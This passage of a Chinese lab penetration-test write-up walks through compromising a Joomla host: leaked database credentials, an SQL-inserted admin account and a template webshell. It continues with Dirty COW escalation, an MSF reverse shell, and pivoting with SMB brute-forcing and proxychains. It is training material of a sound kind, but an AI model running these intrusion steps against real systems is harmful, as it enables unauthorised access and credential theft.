class="line"></span><br><span class="line">Interesting path found from robots.txt</span><br><span class="line">http://192.168.93.100/joomla/administrator/</span><br><span class="line">http://192.168.93.100/administrator/</span><br><span class="line">http://192.168.93.100/bin/</span><br><span class="line">http://192.168.93.100/cache/</span><br><span class="line">http://192.168.93.100/cli/</span><br><span class="line">http://192.168.93.100/components/</span><br><span class="line">http://192.168.93.100/includes/</span><br><span class="line">http://192.168.93.100/installation/</span><br><span class="line">http://192.168.93.100/language/</span><br><span class="line">http://192.168.93.100/layouts/</span><br><span class="line">http://192.168.93.100/libraries/</span><br><span class="line">http://192.168.93.100/logs/</span><br><span class="line">http://192.168.93.100/modules/</span><br><span class="line">http://192.168.93.100/plugins/</span><br><span class="line">http://192.168.93.100/tmp/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Finding common backup files name</span><br><span class="line">[++] Backup files are not found</span><br><span class="line"></span><br><span class="line">[+] Finding common <span class="built_in">log</span> files name</span><br><span class="line">[++] error <span class="built_in">log</span> is not found</span><br><span class="line"></span><br><span class="line">[+] Checking sensitive config.php.x file</span><br><span class="line">[++] Readable config file is found </span><br><span class="line"> config file path : http://192.168.93.100/configuration.php~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your Report : reports/192.168.93.100/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/890.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/891.png" alt="图片"></p><p>其中有利用价值的文件目录有这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.93.100/administrator/</span><br><span class="line">http://192.168.93.100/robots.txt</span><br><span class="line">http://192.168.93.100/configuration.php</span><br></pre></td></tr></table></figure><p><code>administrator</code> 目录是一个登陆页面，尝试了它的默认密码以及弱口令无果：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/892.png" alt="图片"></p><p>来到 <code>robots.txt</code> 文件，没有发现泄漏了重要文件信息：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/893.png" alt="图片"></p><h2 id="登陆Mysql添加新的管理员账号"><a href="#登陆Mysql添加新的管理员账号" class="headerlink" title="登陆Mysql添加新的管理员账号"></a>登陆Mysql添加新的管理员账号</h2><p>但是 <code>configuration.php~</code> 这个文件泄露了 <code>mysql</code> 的数据库连接信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JConfig</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$offline</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$offline_message</span> = <span class="string">&#x27;网站正在维护。&lt;br /&gt; 请稍候访问。&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$display_offline_message</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$offline_image</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sitename</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$editor</span> = <span class="string">&#x27;tinymce&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$captcha</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$list_limit</span> = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$access</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$debug</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$debug_lang</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$debug_lang_const</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$dbtype</span> = <span class="string">&#x27;mysqli&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&#x27;testuser&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;cvcvgjASD!@&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$db</span> = <span class="string">&#x27;joomla&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$dbprefix</span> = <span class="string">&#x27;am2zu_&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$live_site</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&#x27;gXN9Wbpk7ef3A4Ys&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$gzip</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$error_reporting</span> = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$helpurl</span> = <span class="string">&#x27;https://help.joomla.org/proxy?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&amp;lang=&#123;langcode&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ftp_host</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ftp_port</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ftp_user</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ftp_pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ftp_root</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ftp_enable</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$offset</span> = <span class="string">&#x27;UTC&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$mailonline</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$mailer</span> = <span class="string">&#x27;mail&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$mailfrom</span> = <span class="string">&#x27;test@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$fromname</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sendmail</span> = <span class="string">&#x27;/usr/sbin/sendmail&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$smtpauth</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$smtpuser</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$smtppass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$smtphost</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$smtpsecure</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$smtpport</span> = <span class="string">&#x27;25&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$caching</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache_handler</span> = <span class="string">&#x27;file&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cachetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache_platformprefix</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$MetaDesc</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$MetaKeys</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$MetaTitle</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$MetaAuthor</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$MetaVersion</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$robots</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sef</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sef_rewrite</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sef_suffix</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$unicodeslugs</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$feed_limit</span> = <span class="string">&#x27;10&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$feed_email</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log_path</span> = <span class="string">&#x27;/var/www/html/administrator/logs&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$tmp_path</span> = <span class="string">&#x27;/var/www/html/tmp&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$lifetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$session_handler</span> = <span class="string">&#x27;database&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$shared_session</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/894.png" alt="图片"></p><p>如上图所示，我们得到了一个 <code>mysql</code> 的用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user：testuser </span><br><span class="line">pass：cvcvgjASD!@</span><br></pre></td></tr></table></figure><p>用泄露的用户名和密码尝试登陆 <code>mysql</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.93.100 -utestuser -p</span><br><span class="line">pass：cvcvgjASD!@</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/895.png" alt="图片"></p><p>通过查询 <code>joomla</code> 数据库的 <code>am2zu_users</code> 表下的 <code>username</code>、<code>password</code> 字段内容发现 <code>administrator</code> 用户的密码是加密的，而且不知道是啥加密，估计是加盐了。有知道的大佬麻烦告诉我，我会很感激的！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL [joomla]&gt; select username,password from am2zu_users;</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| username      | password                                                     |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| administrator | $2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2 |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/896.png" alt="图片"></p><p>抱着试一试的心态去 <code>cmd5</code> 解密了一下无果：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/897.png" alt="图片"></p><p>额…那么换个思路！既然 <code>admin</code> 的密码拿不到，我们可不可以修改它的密码或者说添加一个管理员用户进去呢？</p><p>通过观看官方文档发现它可以通过 <code>SQL</code> 语句来添加一个新的用户:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/898.png" alt="图片"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一条语句：</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;Administrator2&#x27;</span>, <span class="string">&#x27;admin2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;</span>, <span class="string">&#x27;&#x27;</span>, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">第二条语句：</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line"><span class="keyword">VALUES</span> (LAST_INSERT_ID(),<span class="string">&#x27;8&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/899.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/900.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/901.png" alt="图片"></p><h2 id="Joomla-Getshell"><a href="#Joomla-Getshell" class="headerlink" title="Joomla-Getshell"></a>Joomla-Getshell</h2><p>通过插入 <code>SQL</code> 数据我们成功添加了一个 <code>admin2</code> 用户，密码是 <code>secret</code>，登陆它的 <code>web</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.93.100/administrator/index.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/902.png" alt="图片"></p><p>之后在模板新建一个 <code>php</code> 文件：<code>Extensions</code> -&gt; <code>Templates</code> -&gt; <code>Templates</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/903.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/904.png" alt="图片"></p><p>访问 <code>http://192.168.93.100/templates/beez3/8888.php</code> 得到一枚 <code>SHELL</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/905.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/906.png" alt="图片"></p><p>虽然得到了一枚 <code>webshell</code>，但是发现执行不了 <code>shell</code> 命令！但是呢可以切换目录，我切换目录到网站绝对路径下发现这些文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/html</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100600/rw-------  12288  fil   2019-10-28 09:43:47 -0400  .1.php.swp</span><br><span class="line">100600/rw-------  12288  fil   2019-10-20 02:52:20 -0400  .configuration.php.swp</span><br><span class="line">100644/rw-r--r--  28     fil   2019-10-24 09:25:46 -0400  1.php</span><br><span class="line">100644/rw-r--r--  27     fil   2019-10-24 09:44:42 -0400  2.php</span><br><span class="line">100644/rw-r--r--  18092  fil   2019-09-23 10:22:21 -0400  LICENSE.txt</span><br><span class="line">100644/rw-r--r--  4793   fil   2019-09-23 10:22:21 -0400  README.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  administrator</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  bin</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  cache</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  cli</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  components</span><br><span class="line">100644/rw-r--r--  1927   fil   2019-10-19 08:48:41 -0400  configuration.php</span><br><span class="line">100644/rw-r--r--  1927   fil   2019-10-19 08:50:00 -0400  configuration.php~</span><br><span class="line">100644/rw-r--r--  3159   fil   2019-09-23 10:22:21 -0400  htaccess.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  images</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  includes</span><br><span class="line">100644/rw-r--r--  1420   fil   2019-09-23 10:22:21 -0400  index.php</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  language</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  layouts</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  libraries</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  media</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  modules</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  plugins</span><br><span class="line">100644/rw-r--r--  829    fil   2019-09-23 10:22:21 -0400  robots.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-12-28 08:26:42 -0500  templates</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-12-28 08:26:42 -0500  tmp</span><br><span class="line">100644/rw-r--r--  1859   fil   2019-09-23 10:22:21 -0400  web.config.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/907.png" alt="图片"></p><p>执行不了命令那么我通过<code>疯狂翻目录</code>文件找到了一个 <code>test.txt</code> 文件，里面好像是一个账号密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser wwwuser</span><br><span class="line">passwd www</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/908.png" alt="图片"></p><p>通过得到的密码尝试 <code>SSH</code> 登陆：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/909.png" alt="图片"></p><p>登陆成功后查看了一下<code>内核</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/910.png" alt="图片"></p><h2 id="脏牛提权Linux"><a href="#脏牛提权Linux" class="headerlink" title="脏牛提权Linux"></a>脏牛提权Linux</h2><p>发现内核版本大于 <code>2.6.22</code> ，那么可以用脏牛提权（Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复））</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/FireFart/dirtycow/blob/master/dirty.c</span><br></pre></td></tr></table></figure><p>（到了这里我本来想放弃的，后来是问了团队的老哥给的思路方法才知道）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/911.png" alt="图片"></p><p>提权成功，我们来切换一下用户 <code>firefart</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br><span class="line">pass：my-new-password</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/912.png" alt="图片"></p><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>登陆成功！接下来通过 <code>MSF</code> 生成一个木马来得到一个 <code>shell</code> 进行后渗透：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/913.png" alt="图片"></p><p>通过 <code>xshell</code> 我发现上传不了文件：</p><p>后来通过 <code>WinSCP</code> 工具才上传成功的！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/914.png" alt="图片"></p><p>给 <code>shell.elf</code> 文件<code>可执行</code>权限，然后运行后 <code>MSF</code> 反弹回来一个 <code>shell</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/915.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/916.png" alt="图片"></p><p>之后先添加<code>路由表</code>扫描一下<code>内网存活</code>主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.93.1/24</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/917.png" alt="图片"></p><p>扫描存活主机使用的模块是这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/918.png" alt="图片"></p><p>这个时候扫描出来发现内网存活了这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">192.168.93.1</span><br><span class="line">192.168.93.10</span><br><span class="line">192.168.93.20</span><br><span class="line">192.168.93.30</span><br><span class="line">192.168.93.100</span><br><span class="line">192.168.93.120</span><br></pre></td></tr></table></figure><p>但是不知道它具体是什么操作系统，那么可以通过这个模块来对内网进行探测操作系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_version):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   RHOSTS     192.168.93.1/24  yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   SMBDomain  .                no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                     no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                     no        The username to authenticate as</span><br><span class="line">   THREADS    20               yes       The number of concurrent threads</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/919.png" alt="图片"></p><p>扫描出来有三台主机，其实探测出来的和我们<code>NMAP</code>信息搜集出来的结果八九不离十，只不过是我们知道了靶机 <code>IP</code> 的情况下才探测出来操作系统，而现在是通过横向渗透才知道的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] 192.168.93.20:445     - Host is running Windows 2008 Datacenter SP2 (build:6003) (name:WIN2008) (domain:TEST)</span><br><span class="line">[+] 192.168.93.10:445     - Host is running Windows 2012 R2 Datacenter (build:9600) (name:WIN-8GA56TNV3MV) (domain:TEST)</span><br><span class="line">[+] 192.168.93.30:445     - Host is running Windows 7 Professional SP1 (build:7601) (name:WIN7) (domain:TEST)</span><br></pre></td></tr></table></figure><p>以上三台主机是有 <code>TEST域</code>的，说明他们在一个<code>域</code>里！我通过<code>MSF</code> 爆破 <code>Windows 2008</code> 这台主机的 <code>smb</code> 登陆凭证爆破成功：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/920.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user：administrator</span><br><span class="line">pass：123qwe!ASD</span><br></pre></td></tr></table></figure><p>接着我先把它的流量代理出来，使用 <code>socks4</code> 代理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/server/socks4a</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/921.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/922.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/923.png" alt="图片"></p><p>设置完毕后，配置 <code>proxychains</code> 在 <code>/etc/proxychains.conf</code> 这个文件，在末尾吧端口更改为刚刚设置监听的 <code>1080</code> 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 127.0.0.1 1080</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/924.png" alt="图片"></p><p>为了验证我们是否代理流量成功，我扫了一下 <code>192.168.93.20</code>（Windows 2008）这台主机的端口开放情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -T4 -P 80,1433,3306,3389 192.168.93.20</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/925.png" alt="图片"></p><p>扫描成功！这个时候就可以在扫它内网了！然后我本来想用 <code>Socks4</code>的，但是失败了不知道为啥，后面我又把它换成 <code>Socks5</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/926.png" alt="图片"></p><p>在扫它内网之前我需要吧 <code>KALI</code> 这台主机的流量给代理出来，下面我用到的 <code>socks5</code>代理，工具是 